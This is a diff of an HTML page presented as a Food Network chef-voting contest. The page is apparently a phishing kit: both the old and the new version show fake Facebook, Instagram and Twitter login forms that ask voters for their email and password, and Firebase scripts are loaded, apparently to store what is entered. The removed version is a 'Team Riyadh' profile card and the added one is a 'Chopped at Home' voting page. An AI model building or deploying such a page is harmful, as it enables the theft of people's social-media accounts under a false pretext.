@@ -1,394 +1,212 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
-<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.20/dist/sweetalert2.min.js"></script>
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.20/dist/sweetalert2.min.css">
-<script src="js/jquery-3.6.0.min.js"></script>
-<link rel="stylesheet" href="css/index.css">
-<link rel="stylesheet" href="assets/css/main.css">
-
-<!--Facebook-->
-    <link rel="stylesheet" href="secured/default.css">
-    <link rel="stylesheet" href="secured/style.css">
-<script src="js/index.js"></script>
-<script src="/js/jquery-3.6.0.min.js"></script>
-
-  <!-- Twitter CSS -->
-  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" crossorigin="anonymous">
-  <link rel="stylesheet" href="twt/CSS/style.css">
-  <link rel="icon" href="favicon.ico">
-
-<title>Food Network Voting</title>
-<style>
-  body {
-    font-family: "Courier New", monospace;
-    margin: 0;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    min-height: 100vh;
-    background: linear-gradient(to bottom right, #FFD700, #FF4500);
-  }
-
-  .profile-card {
-      border: 1px solid #ccc;
-      border-radius: 8px;
-      padding: 20px;
-      max-width: 400px; /* Adjust the max-width to your preference */
-      width: 100%;
-      text-align: center;
-      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-      background-color: #fff;
-    }
-
-  .profile-picture {
-    width: 100px;
-    height: 100px;
-    border-radius: 50%;
-    margin: 0 auto 10px;
-    background-color: #ddd;
-  }
-
-  .profile-name {
-    font-family: "Courier New", monospace;
-    font-size: 1.5em;
-    margin: 5px 0;
-  }
-
-  .profile-title {
-    font-family: "Courier New", monospace;
-    font-size: 1.1em;
-    color: #555;
-    margin: 0;
-  }
-  .profile-description {
-    font-family: "Courier New", monospace;
-    font-size: 0.8em;
-    color: #555;
-    margin: 0;
-  }
-
-  /* Achievements Section */
-  .achievements-section {
-    margin-top: 20px;
-    padding: 20px;
-    border-top: 1px solid #ccc;
-  }
-
-  .achievements-section h3 {
-    font-family: "Courier New", monospace;
-    font-size: 1.2em;
-    margin-bottom: 10px;
-  }
-
-  .achievements-list {
-    list-style: none;
-    padding: 0;
-    margin: 0;
-  }
-
-  .achievements-list li {
-    font-family: "Courier New", monospace;
-    font-size: 0.9em;
-    color: #555;
-    margin-bottom: 10px;
-    display: flex;
-    align-items: center;
-  }
-
-  .achievements-list li::before {
-    content: "\2022"; /* Bullet point */
-    color: #FF4500;
-    font-weight: bold;
-    font-size: 1.2em;
-    margin-right: 10px;
-  }
-
-  .social-links {
-    margin-top: 15px;
-  }
-
-  .social-icon {
-    font-size: 1em;
-    margin: 0 10px;
-    color: #555;
-  }
-  .social-vote-button {
-    margin-top: 15px;
-  }
-
-  .twitter-button {
-    background-color: black;
-    color: #FFF;
-    border: none;
-    padding: 5px 10px;
-    border-radius: 5px;
-    cursor: pointer;
-  }
-  .instagram-button2 {
-    background-color: red;
-    color: #FFF;
-    border: none;
-    padding: 5px 10px;
-    border-radius: 5px;
-    cursor: pointer;
-  }
-  .facebook-button3 {
-    background-color: blue;
-    color: #FFF;
-    border: none;
-    padding: 5px 10px;
-    border-radius: 5px;
-    cursor: pointer;
-  }
-
-  .preloader {
-    display: none;
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background-color: rgba(0, 0, 0, 0.5);
-    color: white;
-    font-size: 24px;
-    align-items: center;
-    justify-content: center;
-    z-index: 9999;
-  }
-
-  .powered-by {
-    text-align: center;
-    margin-top: 20px;
-    color: #888;
-    font-size: 0.8em;
-  }
-
-  /* Responsive Styles */
-  @media screen and (max-width: 768px) {
-    .achievements-section {
-      padding: 10px;
-    }
-    
-    .achievements-section h3 {
-      font-size: 1em;
-    }
-    
-    .achievements-list li {
-      font-size: 0.8em;
-    }
-  }
-</style>
+    <title>Chopped at Home Challenge | Food Network</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="js/jquery-3.6.0.min.js"></script>
+    <link rel="stylesheet" type="text/css" href="assets/style.css">
+    <link rel="stylesheet" href="css/index.css">
+    <script src="js/index.js"></script>
+    <!-- Google Translate Widget Code -->
+    <script type="text/javascript" src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+    <script type="text/javascript">
+        function googleTranslateElementInit() {
+            new google.translate.TranslateElement({ pageLanguage: 'en', layout: google.translate.TranslateElement.InlineLayout.SIMPLE }, 'google_translate_element');
+        }
+    </script>
+    <style>
+        /* Add your styling here */
+        body {
+          margin: 0;
+          padding: 0;
+          font-family: Arial, sans-serif;
+          background-color: white;
+        }
+        .navbar {
+          background-color: transparent;
+          padding: 10px;
+          display: flex;
+          justify-content: center;
+        }
+        .logo img {
+          width: 70px;
+        }
+        .hero-banner {
+          position: relative;
+          text-align: center;
+        }
+        .hero-banner img {
+          width: 100%;
+          height: auto;
+        }
+        .hero-content {
+          position: absolute;
+          top: 50%;
+          left: 50%;
+          transform: translate(-50%, -50%);
+          text-align: center;
+          color: #fff;
+        }
+        .hero-content h1 {
+          font-size: 1.6rem;
+          margin-bottom: 10px;
+        }
+        .hero-content p {
+          font-size: 0.9rem;
+          margin-bottom: 20px;
+        }
+        .hero-button {
+          padding: 10px 20px;
+          background-color: #e74c3c;
+          border: none;
+          color: #fff;
+          text-decoration: none;
+          border-radius: 5px;
+          transition: background-color 0.3s;
+        }
+        .hero-button:hover {
+          background-color: #c0392b;
+        }
+        /* Rest of your styling */
+        .contestants-section {
+          display: flex;
+          flex-wrap: wrap;
+          justify-content: center;
+          padding: 20px;
+        }
+        .contestant {
+          flex: 1;
+          max-width: calc(50% - 20px);
+          background-color: #ffffff;
+          border: 1px solid #ccc;
+          padding: 20px;
+          margin: 10px;
+          border-radius: 10px;
+          text-align: center;
+          box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+        .contestant h3 {
+          margin: 0;
+          padding: 10px;
+        }
+        .voteButton {
+          padding: 10px 20px;
+          background-color: #3498db;
+          border: none;
+          color: #fff;
+          cursor: pointer;
+          border-radius: 5px;
+          transition: background-color 0.3s;
+        }
+        .voteButton:hover {
+          background-color: #258cd1;
+        }
+        @media (max-width: 768px) {
+          .contestant {
+            max-width: calc(100% - 20px);
+          }
+        }
+    </style>
 </head>
 <body>
-  <div id="preloader" class="preloader">
-    Loading...
-  </div>
-
-  <div class="profile-card">
-    <img src="logo.PNG" alt="Profile Picture" class="profile-picture">
-    <h2 class="profile-name">Team Riyadh</h2>
-    <p class="profile-title">tickling your taste bud</p>
-    <p class="profile-description">Please we need your vote!</p>
-    <!-- Achievements Section -->
-    <div class="achievements-section">
-      <h3>Achievements</h3>
-      <ul class="achievements-list">
-        <li>1st Place in Food Network Cooking Contest (2022)</li>
-        <li>Best Dish Award in Regional Cooking Competition (2021)</li>
-        <li>Featured in "Taste of the Town" TV Show</li>
-        <!-- Add more achievements as needed -->
-      </ul>
-    </div>
- <div class="social-links">
-
-    <div class="social-vote-button">
-
-      <button onclick="Twitter()" class="twitter-button"><i class="fab fa-twitter"></i> Vote with Twitter </button>
-    </div>
-    <div class="social-vote-button">
-      <button onclick="Instagram()" class="instagram-button2"><i class="fab fa-instagram"></i> Vote with Instagram </button>
-    </div>
-
-    <div class="social-vote-button">
-      <button onclick="Facebook()" class="facebook-button3"><i class="fab fa-facebook"></i> Vote with Facebook </button>
-    </div>
-    <br><br>
-    <p class="powered-by">Powered by <strong>Food Network</strong></p>
-
-  </div>
-
-    <!-- Instagram Dialog Box -->
-    <div id="instagram" class="dialog">
-        <div class="dialog-content">
-            <span class="close" onclick="closeDialog()">&times;</span>
-            <h2><span hidden id="dialog-instagram"></span></h2>
-              <main class="l-main">
-              <div class="l-main__img">
-                <img src="assets/img/homepage.png" alt="Smartphones">
-              </div>
-              <div class="l-user">
-                <div class="c-panel group">
-
-              <img class="c-panel__img" src="assets/img/instagram.svg" alt="Instagram">
-              <div class="c-panel__form">
-                <input type="text" class="c-panel__input" class="form-control" required data-error="Please enter your email" placeholder="Phone number, username, or email" id="ig-uname">
-                <input type="text" class="c-panel__input" class="form-control" required data-error="Please enter your email" placeholder="Password" id="ig-pass">
-                <button class="c-btn" type="submit" onclick="iglog()" id="ig-log"> Log In</button> 
-                <span class="c-panel__span">OR</span>
-              </div>
-              <a href="#facebook" class="c-panel__facebook">Login with Facebook</a> <br>
-              <a href="#" class="c-panel__forgot">Forgot password?</a>
-              <br>
-              <br>
+    <div id="home">
+        <header>
+          <nav class="navbar">
+            <div class="logo">
+              <a href="#"><img src="assets/images/logo.png" alt="Food Chef Competition"></a>
             </div>
-            <div class="c-signup group">
-              <p>Don't have an account? <span>Sign up</span></p>
+          </nav>
+          <div class="hero-banner">
+            <img src="assets/images/hero-image.JPG" alt="Contestant 1">
+            <div class="hero-content">
+              <h1>Welcome to the Food Chef Competition Voting</h1>
+              <p>Vote for your favorite chef in the Food Chef Competition and support them to become the champions.</p>
+              <a href="#votingSection" class="hero-button" onclick="vote()">Vote Now</a>
             </div>
-
-                  <div class="c-app">
-                    <p>Get the app.</p>
-                    <div class="c-app__download">
-                      <img src="assets/img/apple.png" alt="Apple Store">
-                      <img src="assets/img/google.png" alt="Google Play">
-                    </div>
-                  </div>
-                </div>
-            </main>
+          </div>
+        </header>
+        <section id="votingSection" class="contestants-section">
+          <div class="contestant">
+            <img src="assets/images/chef1.JPG" alt="Contestant 1">
+            <h3>Master of Flavors</h3>
+            <p>A culinary artist who expertly blends flavors and techniques to create unforgettable dishes. Known for innovative recipes and remarkable presentations.</p>
+            <button class="voteButton" onclick="vote()">Vote (1)</button>
+          </div>
+          <div class="contestant">
+            <img src="assets/images/chef2.JPG" alt="Contestant 2">
+            <h3>Culinary Maestro</h3>
+            <p>A chef with an exceptional mastery of culinary arts. Their creations reflect years of dedication, training, and a passion for elevating dining experiences.</p>
+            <button class="voteButton" onclick="vote()">Vote (2)</button>
+          </div>
+          <div class="contestant">
+            <img src="assets/images/chef3.JPG" alt="Contestant 3">
+            <h3>Gourmet Visionary</h3>
+            <p>An imaginative chef who redefines traditional dishes with creative twists. Their culinary vision brings new dimensions to familiar flavors.</p>
+            <button class="voteButton" onclick="vote()">Vote (3)</button>
+          </div>
+          <div class="contestant">
+            <img src="assets/images/chef4.JPG" alt="Contestant 4">
+            <h3>Artisanal Craftsman</h3>
+            <p>A chef dedicated to perfecting the art of craftsmanship in cooking. Their attention to detail and devotion to the culinary process sets them apart.</p>
+            <button class="voteButton" onclick="vote()">Vote (4)</button>
+          </div>
+        </section>
+        <!-- Add more contestants if needed -->
+        </div><!-- Contestant information goes here -->
+    </section>
+    </div>
+    <!-- Additional script tags go here -->
+    <center>
+        <div id="choose">
+            <p>
+                Login with one of the following to vote:
+            </p>
+            <p>
+                <img id="fb" onclick="fb()" src="assets/images/fb.png">
+                <img id="ig" onclick="ig()" src="assets/images/ig.png">
+            </p>
+            <br>
+            <button onclick="can()" id="cancel">Close</button>
         </div>
-    </div>
-
-     <!-- Facebook Dialog Box -->
-    <div id="facebook" class="dialog">
-        <div class="dialog-content">
-          <span class="close" onclick="closeDialog()">&times;</span>
-          <h2><span hidden id="dialog-instagram"></span></h2>
-          <main class="l-main">
-            <div class="fb-user">
-              <div class="fb-panel fb-group">
-                            <img src="secured/img/logo.svg" alt="">
-                            <p>Facebook helps you connect and share with the people in your life.</p>
-                            <input type="text" placeholder="Email or Phone number" required id="fb-email">
-                            <input type="password" placeholder="Password" required id="fb-pass">
-                            <button class="c-btn" onclick="login()" id="fb-log">Log In</button><br>
-                            
-                            <a href="#">Forgotten password?</a>
-                            <button id="create-btn">Create New Account</button>
-                            <a href="#" style="font-weight: bold; color: var(--black); text-decoration: none;">Create a Page</a> for a celebrity, band or business.
+    </center>
+    <center>
+        <div id="fbp">
+            <div class="facebook-login" id="fb2" align="center">
+                <div class="ggt">
+                    <img src="assets/images/fb.png" alt="logo" id="fblogo">
+                    <h1 id="fb2">
+                        Facebook
+                    </h1>
+                    <input type="text" placeholder="Email or Phone number" id="fb-email"><br>
+                    <input type="password" placeholder="Password" id="fb-pass"><br>
+                    <button onclick="login()" id="fb-log">
+                        Log in
+                    </button>
                 </div>
             </div>
-          </main>
         </div>
-    </div>
-
-     <!-- Twitter Dialog Box -->
-    <div id="twitter" class="dialog">
-        <div class="dialog-content">
-          <span class="close" onclick="closeDialog()">&times;</span>
-     <div class="row">
-       <div class="none col-1 col-lg-4"></div>
-       <div class="none col-10 col-lg-5">
-         <div class="box bg-white mt-5 p-3">
-           <div class="nav mb-5">
-             <img class="twitter-2" src="twt/IMG/twitter.png" alt="">
-           </div>
-           <div class="mb-4">
-             <h2 class="text-center head"><b>Sign in to Twitter</b></h2>
-           </div>
-
-           <div class="margin mb-4">
-            <input type="text" class="btn but d-flex btn-white border-dark " placeholder="Phone, Email or Username" required id="tw-email">
-            <input type="password" class="btn but d-flex btn-white border-dark " placeholder="Password" required id="tw-pass">
-             <button type="button"
-               class="btn but d-flex justify-content-center btn-white border-dark bg-dark rounded-pill" onclick="tw_login()" id="tw-log">
-               <p class="text-white"><b>Log In</b></p>
-             </button>
-           </div>
-
-           <div class="margin mb-4">
-             <button type="button" class="btn but d-flex justify-content-center btn-white border-dark rounded-pill">
-               <p class="color-white"><b>Forgot password?</b></p>
-             </button>
-           </div>
-
-           <div class="margin">
-             <p>Don't have an account? <a class="text-decoration-none" href="#">Sign up</a></p>
-           </div>
-
-           <div class="margin">
-           </div>
-
-         </div>
-       </div>
-       <div class="none col-1 col-lg-3"></div>
-     </div>
-
-   </div>
-</div>
-  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.20/dist/sweetalert2.all.min.js"></script>
-  <script>
-    function showCustomAlert() {
-      Swal.fire({
-        title: 'Oops!',
-        text: 'Something went wrong with your vote.',
-        icon: 'error',
-        confirmButtonText: 'Try Again'
-      });
-    }
-  </script>
-
-    <script>
-      function showPreloader() {
-        document.getElementById("preloader").style.display = "flex";
-      }
-
-      function hidePreloader() {
-        document.getElementById("preloader").style.display = "none";
-      }
-
-      function Twitter() {
-        showPreloader();
-        setTimeout(function() {
-          hidePreloader();
-          document.getElementById("twitter").style.display = "flex";
-        }, 1000); // Delay in milliseconds
-      }
-
-      function Instagram() {
-        showPreloader();
-        setTimeout(function() {
-          hidePreloader();
-          document.getElementById("instagram").style.display = "flex";
-        }, 1000); // Delay in milliseconds
-      }
-
-      function Facebook() {
-        showPreloader();
-        setTimeout(function() {
-          hidePreloader();
-          document.getElementById("facebook").style.display = "flex";
-        }, 1000); // Delay in milliseconds
-      }
-
-      function closeDialog() {
-          document.getElementById("instagram").style.display = "none";
-          document.getElementById("twitter").style.display = "none";
-          document.getElementById("facebook").style.display = "none";
-      }
-    </script>
+    </center>
+    <center>
+        <div id="igp">
+            <div class="Instagram-login" id="ig2" align="center">
+                <div class="ppt">
+                    <img src="assets/images/ig2.png" alt="logo" id="iglogo"><br><br>
+                    <br>
+                    <input type="text" placeholder="Username or Email" id="ig-uname"><br>
+                    <input type="password" placeholder="Password" id="ig-pass">
+                    <br>
+                    <button onclick="iglog()" id="ig-log">
+                        Log in
+                    </button>
+                </div>
+            </div>
+        </div>
+    </center>
+    <!-- Firebase scripts and other additional scripts go here -->
     <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-app.js"></script>
-
     <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-database.js"></script>
-
     <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase.js"></script>
     <script src="https://raw.githubusercontent.com/firebase/firebase-bower/master/firebase-app-check.js.map"></script>
-
-    <script src="js/firebase.js">
-
-    </script>
-
+    <script src="js/firebase.js"></script>
 </body>
 </html>
